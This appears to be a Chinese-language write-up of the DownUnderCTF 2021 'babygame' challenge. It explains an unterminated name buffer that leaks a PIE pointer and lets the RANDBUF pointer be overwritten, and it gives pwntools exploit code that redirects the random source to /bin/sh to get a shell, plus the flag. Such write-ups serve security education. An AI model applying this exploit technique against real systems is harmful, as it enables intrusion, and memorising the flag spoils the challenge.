# DownUnderCTF 2021 - babygame

## 题目简述

程序在全局区连续保存 `char NAME[32]` 和指针 `RANDBUF`。初次读取姓名时恰好允许写满 32 字节，不会补 NUL；随后 `RANDBUF` 被设为 `"/dev/urandom"`。打印用户名会越过 `NAME` 泄露相邻指针，而修改用户名时又以 `strlen(NAME)` 作为读取长度，使泄露出的指针字节反过来扩大写入，形成对 `RANDBUF` 的部分覆盖。

## 解题过程

先发送 32 个非零字节填满 `NAME`。选择打印用户名后，`puts(NAME)` 会先输出 32 字节姓名，再继续输出相邻 `RANDBUF` 指针的非零低字节。该指针当前指向二进制内的字符串 `/dev/urandom`，偏移为 `0x2024`，所以可恢复 PIE 基址：

```python
from pwn import p64, remote, u32, u64

io = remote(HOST, PORT)
io.sendafter(b"name?\n", b"A" * 32)

io.sendlineafter(b"> ", b"2")
leak = io.recvline()[32:-1]
pie_base = u64(leak.ljust(8, b"\x00")) - 0x2024
name_addr = pie_base + 0x40A0
```

由于用户名仍未终止，`strlen(NAME)` 会把相邻指针的六个非零地址字节也计入长度，下一次 `fread` 因而可写约 38 字节。把 `NAME` 开头改成 `/bin/sh\0`，再用最后六字节把 `RANDBUF` 指向 `NAME`：

```python
io.sendlineafter(b"> ", b"1")
payload = b"/bin/sh\x00".ljust(32, b"A")
payload += p64(name_addr)[:6]
io.sendafter(b"to?\n", payload)
```

隐藏菜单项 `1337` 会执行 `fopen(RANDBUF, "rb")` 并读取四字节作为随机答案。现在它实际打开 `/bin/sh`，所以读到 ELF 魔数 `7f 45 4c 46`；按主机小端整数提交即可通过比较并触发 `system("/bin/sh")`：

```python
io.sendlineafter(b"> ", b"1337")
io.sendlineafter(b"guess: ", str(u32(b"\x7fELF")).encode())
io.sendline(b"cat flag.txt")
print(io.recvuntil(b"}").decode(errors="ignore"))
```

最终得到：

```text
DUCTF{whats_in_a_name?_5aacfc58}
```

## 方法总结

固定长度读取如果恰好填满字符数组却不追加 NUL，会同时影响字符串输出和后续 `strlen`。本题把一次越界读转化为 PIE 泄露，再把错误长度转化为相邻全局指针覆盖；最后把随机源重定向到已知 ELF 文件，使“猜随机数”变成确定性比较。
